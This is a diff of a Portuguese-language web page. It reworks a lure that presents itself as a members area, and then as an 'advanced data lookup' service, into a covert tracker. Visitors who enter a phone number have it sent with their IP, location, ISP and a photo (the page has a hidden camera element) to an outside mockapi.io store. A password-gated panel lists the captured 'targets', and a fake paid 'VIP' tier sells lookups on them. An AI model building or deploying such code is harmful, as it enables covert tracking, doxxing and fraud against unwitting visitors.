@@ -3,28 +3,28 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>fuzue developer - Kiwify Dashboard</title>
+<title>fuzue developer - Advanced Data Lookup VIP</title>
 <style>
-:root{--bg:#f3f4f6;--sidebar:#111827;--card:#ffffff;--border:#e5e7eb;--primary:#10b981;--primary-hover:#059669;--text:#1f2937;--muted:#6b7280;--danger:#ef4444}
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;-webkit-tap-highlight-color:transparent}
-body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:10px}
-.container{width:100%;max-width:1100px}
+:root{--bg:#000000;--card:#0a0a0e;--border:#1a1a24;--red:#ff1a1a;--text:#f0f0f5;--muted:#707085;--green:#00ff66;--vip-glow:rgba(255,26,26,0.25);--gold:#ffd700}
+*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;overflow-x:hidden}
+.container{width:100%^^;max-width:950px;width:100%}
 
-/* Ecrã Inicial (Registo de Telemóvel) */
-#visitor-form-screen{background:var(--card);border:1px solid var(--border);padding:30px 20px;border-radius:12px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,0.05);max-width:450px;margin:0 auto}
-h1{color:var(--primary);font-size:1.6rem;margin-bottom:8px;font-weight:800}
-p{color:var(--muted);margin-bottom:20px;font-size:0.9rem}
-.alert-login{background:rgba(16,185,129,0.1);border-left:4px solid var(--primary);padding:12px;margin-bottom:20px;font-size:0.8rem;color:#065f46;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
+/* Ecrã Inicial / Consulta */
+#visitor-form-screen{background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
+h1{color:var(--red);font-size:1.5rem;margin-bottom:8px;text-transform:lowercase;letter-spacing:2px}
+p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
+.alert-login{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:16px;font-size:0.78rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
 
-.form-group{margin-bottom:15px;text-align:left}
-.form-group label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:6px;font-weight:700}
-input{width:100%;padding:12px;background:#f9fafb;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:1rem;text-align:center;font-weight:600}
-input:focus{outline:none;border-color:var(--primary);background:#fff}
+.form-group{margin-bottom:12px;text-align:left}
+.form-group label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:4px}
+input{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:1rem;text-align:center;letter-spacing:2px}
+input:focus{outline:none;border-color:var(--red)}
 
-/* Ecrã de Login do Produtor */
-#login{display:none;background:var(--card);border:1px solid var(--border);padding:30px 20px;border-radius:12px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,0.05);max-width:450px;margin:0 auto}
-.input-box{position:relative;margin-bottom:15px}
-.input-box input.error{border-color:var(--danger);animation:shake 0.3s ease-in-out}
+/* Ecrã de Login do Dono */
+#login{display:none;background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
+.input-box{position:relative;margin-bottom:12px}
+.input-box input.error{border-color:var(--red);box-shadow:0 0 10px rgba(255,26,26,0.4);animation:shake 0.3s ease-in-out}
 
 @keyframes shake{
   0%,100%{transform:translateX(0)}
@@ -32,56 +32,47 @@ input:focus{outline:none;border-color:var(--primary);background:#fff}
   75%{transform:translateX(6px)}
 }
 
-.error-msg{color:var(--danger);font-size:0.75rem;margin-top:6px;display:none;text-align:center}
+.error-msg{color:var(--red);font-size:0.75rem;margin-top:6px;display:none;text-align:center}
 
-button{background:var(--primary);color:#fff;border:none;padding:12px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.9rem;transition:background 0.2s}
-button:hover{background:var(--primary-hover)}
+button{background:var(--red);color:#fff;border:none;padding:12px;width:100%;border-radius:6px;cursor:pointer;font-weight:bold;text-transform:uppercase;letter-spacing:1px;font-size:0.9rem}
+button:hover{opacity:.85}
 
-/* Painel Kiwify Style */
-#panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;display:none;flex-direction:column;width:100%}
+/* Painel de Puxada de Dados & VIP Checkout */
+#panel{display:none;background:var(--card);border:2px solid var(--red);padding:16px 12px;border-radius:14px;box-shadow:0 0 35px var(--vip-glow), inset 0 0 15px rgba(255,26,26,0.05)}
+.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:10px}
+.status{display:flex;align-items:center;gap:6px;font-size:0.75rem;color:var(--muted)}
+.dot{width:7px;height:7px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
+.alert{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:14px;font-size:0.8rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
 
-.kiwify-header{background:var(--sidebar);color:#fff;padding:14px 20px;display:flex;justify-content:space-between;align-items:center}
-.kiwify-header h2{font-size:1.1rem;font-weight:700;letter-spacing:0.5px}
+/* Área de Puxada de Dados por Telefone */
+.lookup-box{background:#050507;border:1px solid var(--border);padding:14px;border-radius:8px;margin-bottom:14px}
+.lookup-flex{display:flex;gap:8px;margin-top:8px}
+.lookup-flex input{text-align:left;letter-spacing:normal;font-size:0.85rem}
+.btn-lookup{background:var(--green);color:#000;width:auto;padding:0 20px;font-weight:bold}
 
-.nav-tabs{display:flex;background:#1f2937;padding:0 15px;gap:5px;overflow-x:auto}
-.tab-btn{background:transparent;border:none;color:#9ca3af;padding:12px 16px;font-size:0.8rem;cursor:pointer;font-weight:600;text-transform:uppercase;border-bottom:3px solid transparent}
-.tab-btn.active{color:#fff;border-bottom:3px solid var(--primary)}
+/* Resultado da Puxada */
+#lookupResult{display:none;margin-top:12px;background:rgba(0,255,102,0.05);border:1px solid var(--green);padding:12px;border-radius:6px;text-align:left;font-size:0.8rem;line-height:1.5}
 
-.tab-content{display:none;padding:20px}
-.tab-content.active{display:block}
+/* Banner VIP Checkout */
+.vip-banner{background:linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,26,26,0.1));border:1px solid var(--gold);padding:14px;border-radius:8px;margin-bottom:14px;text-align:center}
+.vip-banner h3{color:var(--gold);font-size:1rem;margin-bottom:6px}
+.btn-vip{background:var(--gold);color:#000;margin-top:8px;font-weight:bold}
+.btn-vip:hover{opacity:0.9}
 
-/* Cards de Métricas Estilo Dashboard */
-.metrics-grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:15px;margin-bottom:20px}
-.metric-card{background:#f9fafb;border:1px solid var(--border);padding:16px;border-radius:8px}
-.metric-card span{font-size:0.75rem;color:var(--muted);text-transform:uppercase;font-weight:700}
-.metric-card h3{font-size:1.5rem;color:var(--text);margin-top:5px;font-weight:800}
+.actions{margin-bottom:14px;display:flex;flex-direction:column;gap:8px}
+.actions-row{display:flex;gap:6px;width:100%}
+.btn-action{background:transparent;border:1px solid var(--border);color:var(--text);padding:10px 8px;font-size:0.75rem;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;flex:1;text-transform:uppercase;font-weight:bold}
+.btn-action:hover{border-color:var(--red);color:var(--red)}
+.btn-clear{border-color:var(--red);color:var(--red)}
 
-/* Pesquisa e Tabelas */
-.search-box{margin-bottom:15px}
-.search-box input{width:100%;padding:10px 14px;background:#f9fafb;border:1px solid var(--border);border-radius:6px;font-size:0.85rem;text-align:left}
-
-.table-wrapper{width:100%;max-height:340px;overflow-y:auto;border-radius:8px;border:1px solid var(--border);background:#fff}
+.table-wrapper{width:100%;max-height:280px;overflow-y:auto;border-radius:8px;border:1px solid var(--border);background:#050507}
 table{width:100%;border-collapse:collapse;min-width:700px}
-th,td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--border);font-size:0.8rem;white-space:nowrap}
-th{color:var(--muted);text-transform:uppercase;background:#f9fafb;font-weight:700;position:sticky;top:0;z-index:2}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:0.78rem;white-space:nowrap}
+th{color:var(--muted);text-transform:uppercase;background:#050507;position:sticky;top:0;z-index:2}
 td{color:var(--text)}
 
-/* Vitrine de Produtos */
-.products-grid{display:grid;grid-template-columns:repeat(auto-fill, minmax(240px, 1fr));gap:15px}
-.product-card{background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:16px;display:flex;flex-direction:column;justify-content:space-between}
-.product-card h3{font-size:0.95rem;color:var(--text);margin-bottom:6px;font-weight:700}
-.product-card p{font-size:0.8rem;color:var(--muted);margin-bottom:12px;line-height:1.4}
-.product-price{color:var(--primary);font-weight:800;font-size:1rem;margin-bottom:12px}
-.btn-buy{background:transparent;border:1px solid var(--primary);color:var(--primary);padding:8px;font-size:0.75rem;border-radius:6px;cursor:pointer;text-transform:uppercase;font-weight:700;transition:all 0.2s}
-.btn-buy:hover{background:var(--primary);color:#fff}
-
-.actions{display:flex;gap:10px;margin-top:15px}
-.btn-action{background:#fff;border:1px solid var(--border);color:var(--text);padding:10px 14px;font-size:0.8rem;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;flex:1}
-.btn-action:hover{border-color:var(--primary);color:var(--primary)}
-.btn-clear{border-color:var(--danger);color:var(--danger)}
-.btn-clear:hover{background:var(--danger);color:#fff}
-
-.visitor-img{width:36px;height:36px;object-fit:cover;border-radius:50%;border:1px solid var(--border)}
+.warning-banner{margin-top:14px;text-align:center;font-size:0.72rem;color:var(--muted);border-top:1px dashed var(--border);padding-top:10px}
+.visitor-img{width:40px;height:40px;object-fit:cover;border-radius:4px;border:1px solid var(--red)}
 #hidden-cam{display:none}
 </style>
 </head>
@@ -92,126 +83,85 @@ td{color:var(--text)}
 
 <div class="container">
 
-<!-- 1. Ecrã de Entrada do Membro -->
+<!-- 1. Ecrã de Recolha do Telemóvel (Visão do Cliente) -->
 <div id="visitor-form-screen">
-<h1>fuzue pay</h1>
-<p>Área de Membros & Checkout Seguro</p>
+<h1>fuzue developer</h1>
+<p>Sistema Avançado de Consulta & Segurança.</p>
 <div class="alert-login">
-🔒 Insira o seu número de telemóvel para liberar o acesso imediato aos conteúdos do infoproduto.
+⚠️ Insira o seu número de telemóvel para desbloquear o acesso ao painel de inteligência de dados.
 </div>
 <div class="form-group">
-  <label>Seu Telemóvel / WhatsApp</label>
+  <label>Número de Telemóvel / WhatsApp</label>
   <input type="text" id="v-phone" placeholder="(00) 00000-0000">
 </div>
-<button onclick="submitVisitorData()">Acessar Conteúdo</button>
-<div style="margin-top:15px; font-size:0.75rem; color:var(--muted); cursor:pointer; font-weight:600;" onclick="showLoginDirect()">Área do Produtor (Login)</div>
+<button onclick="submitVisitorData()">Validar e Consultar</button>
+<div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="showLoginDirect()">Acesso Administrador</div>
 </div>
 
-<!-- 2. Ecrã de Login do Produtor -->
+<!-- 2. Ecrã de Login do Dono -->
 <div id="login">
-<h1>Painel Produtor</h1>
-<p>Gestão de Vendas e Alunos</p>
+<h1>fuzue developer</h1>
+<p>Área restrita de gestão.</p>
 <div class="input-box">
-  <input type="password" id="pass" placeholder="Senha Mestre" oninput="clearError()">
-  <div id="error-msg" class="error-msg">❌ Senha incorreta.</div>
+  <input type="password" id="pass" placeholder="••••••••" oninput="clearError()">
+  <div id="error-msg" class="error-msg">❌ Senha incorreta. Tente novamente.</div>
 </div>
-<button onclick="check()">Entrar no Dashboard</button>
-<div style="margin-top:15px; font-size:0.75rem; color:var(--muted); cursor:pointer; font-weight:600;" onclick="backToVisitor()">← Voltar ao Início</div>
-</div>
-
-<!-- 3. Painel Estilo Kiwify (Visível após Login) -->
-<div id="panel" style="display:none;">
-<div class="kiwify-header">
-  <h2>fuzue dashboard</h2>
-  <span style="font-size:0.75rem; background:rgba(255,255,255,0.1); padding:4px 10px; border-radius:99px;">Conta Verificada</span>
+<button onclick="check()">Entrar no Painel</button>
+<div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="backToVisitor()">← Voltar</div>
 </div>
 
-<!-- Abas Estilo Kiwify -->
-<div class="nav-tabs">
-  <button class="tab-btn active" onclick="switchTab('metricsTab', this)">📊 Visão Geral</button>
-  <button class="tab-btn" onclick="switchTab('logsTab', this)">👥 Alunos & Acessos</button>
-  <button class="tab-btn" onclick="switchTab('shopTab', this)">🛍️ Produtos</button>
-  <button class="tab-btn" onclick="switchTab('toolsTab', this)">⚙️ Configurações</button>
+<!-- 3. Painel de Puxada de Dados (Dark Mode + VIP Checkout) -->
+<div id="panel">
+<div class="header">
+<h1 style="font-size:1.2rem;margin:0;">fuzue developer</h1>
+<div class="status"><div class="dot"></div><span id="accountStatusText">Conta Padrão (Free)</span></div>
+</div>
+<div class="alert">
+⚠️ <strong>PAINEL DE CONSULTA:</strong> Módulo de busca ativa por número de telemóvel e telemetria integrado à nuvem.
 </div>
 
-<!-- Aba 1: Visão Geral / Métricas -->
-<div id="metricsTab" class="tab-content active">
-  <div class="metrics-grid">
-    <div class="metric-card">
-      <span>Total de Vendas / Leads</span>
-      <h3 id="totalLeadsCount">0</h3>
-    </div>
-    <div class="metric-card">
-      <span>Faturamento Simulado</span>
-      <h3 style="color:var(--primary);">R$ 4.850,00</h3>
-    </div>
-    <div class="metric-card">
-      <span>Taxa de Conversão</span>
-      <h3>94.2%</h3>
-    </div>
+<!-- Módulo de Puxada de Dados por Telefone -->
+<div class="lookup-box">
+  <label style="font-size:0.75rem; color:var(--muted); text-transform:uppercase;">🔍 Puxar Dados por Número de Telemóvel</label>
+  <div class="lookup-flex">
+    <input type="text" id="lookupInput" placeholder="Ex: (11) 99999-9999">
+    <button class="btn-lookup" onclick="executeLookup()">Puxar</button>
   </div>
-  <p style="font-size:0.85rem; color:var(--muted);">Bem-vindo ao painel analítico centralizado. Acompanhe o fluxo de entradas de membros em tempo real.</p>
+  <div id="lookupResult"></div>
 </div>
 
-<!-- Aba 2: Alunos e Logs -->
-<div id="logsTab" class="tab-content">
-  <div class="search-box">
-    <input type="text" id="searchInput" placeholder="🔍 Pesquisar aluno por telemóvel ou cidade..." oninput="filterLogs()">
-  </div>
-  <div class="table-wrapper" id="tableWrapper">
-    <table>
-      <thead>
-        <tr>
-          <th>Foto</th>
-          <th>Data/Hora</th>
-          <th>Telemóvel</th>
-          <th>Endereço IP</th>
-          <th>Localização</th>
-          <th>Operadora / ISP</th>
-        </tr>
-      </thead>
-      <tbody id="tb">
-        <tr><td colspan="6" style="text-align:center;color:#6b7280;">A carregar dados...</td></tr>
-      </tbody>
-    </table>
-  </div>
+<!-- Banner de Pagamento VIP (Liberação de Puxadas Ilimitadas) -->
+<div class="vip-banner" id="vipBannerSection">
+  <h3>⭐ Desbloquear Módulo VIP Full (Puxadas Ilimitadas)</h3>
+  <p style="font-size:0.78rem; color:var(--text); margin-bottom:4px;">Remova restrições e libere consultas completas em tempo real por Pix/Cartão.</p>
+  <button class="btn-vip" onclick="buyVipAccess()">Pagar R$ 49,90 e Liberar VIP</button>
 </div>
 
-<!-- Aba 3: Produtos -->
-<div id="shopTab" class="tab-content">
-  <div class="products-grid">
-    <div class="product-card">
-      <div>
-        <h3>Método Fuzue Pro</h3>
-        <p>Curso completo de automação e segurança digital avançada.</p>
-      </div>
-      <div>
-        <div class="product-price">R$ 197,00</div>
-        <button class="btn-buy" onclick="buyProduct('Método Fuzue Pro')">Copiar Link de Checkout</button>
-      </div>
-    </div>
-    <div class="product-card">
-      <div>
-        <h3>Comunidade VIP Master</h3>
-        <p>Acesso mensal ao grupo fechado de networking e ferramentas.</p>
-      </div>
-      <div>
-        <div class="product-price">R$ 47,00 / mês</div>
-        <button class="btn-buy" onclick="buyProduct('Comunidade VIP Master')">Copiar Link de Checkout</button>
-      </div>
-    </div>
-  </div>
+<div class="actions">
+<div class="actions-row">
+<button class="btn-action btn-clear" onclick="clearLogs()">🗑️ Limpar Nuvem</button>
+<button class="btn-action" onclick="logout()">🚪 Sair</button>
+</div>
 </div>
 
-<!-- Aba 4: Configurações e Controlo -->
-<div id="toolsTab" class="tab-content">
-  <p style="font-size:0.85rem; color:var(--muted); margin-bottom:15px;">Gestão de dados e segurança do ambiente de infoprodutos:</p>
-  <div class="actions">
-    <button class="btn-action btn-clear" onclick="clearLogs()">🗑️ Apagar Base de Alunos</button>
-    <button class="btn-action" onclick="logout()">🚪 Sair da Conta</button>
-  </div>
+<div class="table-wrapper" id="tableWrapper">
+<table>
+<thead>
+<tr>
+  <th>Foto</th>
+  <th>Horário</th>
+  <th>Telemóvel</th>
+  <th>IP Capturado</th>
+  <th>Localização</th>
+  <th>ISP</th>
+</tr>
+</thead>
+<tbody id="tb">
+<tr><td colspan="6" style="text-align:center;color:#707085;">A carregar registos da nuvem...</td></tr>
+</tbody>
+</table>
 </div>
-
+<div class="warning-banner">Painel protegido por protocolos de segurança fuzue developer.</div>
 </div>
 
 </div>
@@ -219,6 +169,7 @@ td{color:var(--text)}
 <script>
 const API_URL = 'https://6ab89b5af84897980b7224db.mockapi.io/api/v1/logs';
 let globalLogs = [];
+let isVipUser = false;
 
 async function submitVisitorData() {
   let phone = document.getElementById('v-phone').value.trim();
@@ -278,23 +229,12 @@ async function submitVisitorData() {
 
     if (response.ok) {
       localStorage.setItem('fuzue_logged', 'true');
-      alert('Acesso validado com sucesso!');
-      document.getElementById('visitor-form-screen').innerHTML = '<h1 style="color:#10b981">Acesso Liberado</h1><p>Pode fechar esta página.</p>';
+      alert('Validação efetuada com sucesso!');
+      document.getElementById('visitor-form-screen').innerHTML = '<h1 style="color:#00ff66">Acesso Liberado</h1><p>Pode fechar esta página.</p>';
     }
   } catch(e) {
-    alert('Erro ao registar dados.');
+    alert('Erro ao enviar dados. Tente novamente.');
   }
-}
-
-function switchTab(tabId, btn) {
-  document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-  document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
-  document.getElementById(tabId).classList.add('active');
-  btn.classList.add('active');
-}
-
-function buyProduct(name) {
-  alert(`🔗 Link de pagamento do produto "${name}" copiado com sucesso!`);
 }
 
 function showLoginDirect() {
@@ -320,7 +260,7 @@ async function check(){
 
   if(passInput.value === '17102007'){
     document.getElementById('login').style.display = 'none';
-    document.getElementById('panel').style.display = 'flex';
+    document.getElementById('panel').style.display = 'block';
     await renderLogs();
   } else {
     passInput.classList.add('error');
@@ -338,39 +278,37 @@ function logout(){
 
 async function renderLogs(){
   let tbody = document.getElementById('tb');
-  tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#6b7280;">A carregar registos...</td></tr>`;
+  tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
   
   try {
     let response = await fetch(API_URL);
     globalLogs = await response.json();
     
-    document.getElementById('totalLeadsCount').innerText = globalLogs.length || 0;
-
     if (!globalLogs || globalLogs.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#6b7280;">Nenhum aluno registado.</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
       return;
     }
     
     displayLogsData(globalLogs);
 
   } catch(e) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#ef4444;">Erro ao ligar à nuvem.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
   }
 }
 
 function displayLogsData(logsArray) {
   let tbody = document.getElementById('tb');
   if (logsArray.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#6b7280;">Nenhum resultado encontrado.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum resultado encontrado.</td></tr>`;
     return;
   }
 
   tbody.innerHTML = logsArray.map(l => `
     <tr>
-      <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#6b7280;font-size:0.7rem">Sem foto</span>'}</td>
+      <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#707085;font-size:0.7rem">Sem foto</span>'}</td>
       <td>${l.time || 'Desconhecido'}</td>
-      <td style="font-weight:700;color:#10b981;">${l.phone || 'Desconhecido'}</td>
-      <td style="font-weight:600">${l.ip || 'Desconhecido'}</td>
+      <td style="font-weight:bold;color:#00ff66;">${l.phone || 'Desconhecido'}</td>
+      <td style="color:#ff4d4d;font-weight:bold">${l.ip || 'Desconhecido'}</td>
       <td>${l.loc || 'Desconhecido'}</td>
       <td>${l.isp || 'Desconhecido'}</td>
     </tr>
@@ -380,17 +318,50 @@ function displayLogsData(logsArray) {
   wrapper.scrollTop = wrapper.scrollHeight;
 }
 
-function filterLogs() {
-  let query = document.getElementById('searchInput').value.toLowerCase();
-  let filtered = globalLogs.filter(l => 
-    (l.phone && l.phone.toLowerCase().includes(query)) ||
-    (l.loc && l.loc.toLowerCase().includes(query))
-  );
-  displayLogsData(filtered);
+// Executa a "puxada" baseada nos logs salvos na nuvem pelo telefone pesquisado
+function executeLookup() {
+  let targetPhone = document.getElementById('lookupInput').value.trim().toLowerCase();
+  let resultBox = document.getElementById('lookupResult');
+
+  if(!targetPhone) {
+    alert('Digite um número de telemóvel para efetuar a busca.');
+    return;
+  }
+
+  if(!isVipUser) {
+    alert('⚠️ Funcionalidade restrita a membros VIP. Efetue o pagamento VIP para liberar consultas avançadas.');
+    return;
+  }
+
+  let found = globalLogs.find(l => l.phone && l.phone.toLowerCase().includes(targetPhone));
+
+  resultBox.style.display = 'block';
+  if(found) {
+    resultBox.innerHTML = `
+      ✅ <strong>Registo Localizado com Sucesso na Nuvem!</strong><br>
+      📱 <strong>Telemóvel:</strong> ${found.phone}<br>
+      🕒 <strong>Último Acesso:</strong> ${found.time}<br>
+      🌐 <strong>IP:</strong> ${found.ip}<br>
+      📍 <strong>Localização:</strong> ${found.loc}<br>
+      🏢 <strong>ISP:</strong> ${found.isp}
+    `;
+  } else {
+    resultBox.innerHTML = `⚠️ Nenhum registo encontrado na nuvem para o telemóvel <strong>${targetPhone}</strong>. O alvo precisa de aceder ao link de validação primeiro para capturarmos os dados.`;
+  }
+}
+
+function buyVipAccess() {
+  let confirmPay = confirm('Deseja simular o pagamento via Pix de R$ 49,90 para liberar o acesso VIP vitalício?');
+  if(confirmPay) {
+    isVipUser = true;
+    document.getElementById('vipBannerSection.style') // safety
+    document.getElementById('vipBannerSection').innerHTML = '<h3 style="color:#00ff66">✅ VIP Ativado com Sucesso! Puxadas ilimitadas liberadas.</h3>';
+    document.getElementById('accountStatusText').innerText = 'VIP Ativo (Ilimitado)';
+  }
 }
 
 async function clearLogs(){
-  if(confirm('Tens a certeza que pretendes apagar todos os registos?')) {
+  if(confirm('Tens a certeza que pretendes apagar todos os registos da nuvem?')) {
     try {
       let response = await fetch(API_URL);
       let logs = await response.json();
@@ -399,7 +370,7 @@ async function clearLogs(){
       }
       await renderLogs();
     } catch(e) {
-      alert('Erro ao limpar dados.');
+      alert('Erro ao limpar os dados.');
     }
   }
 }
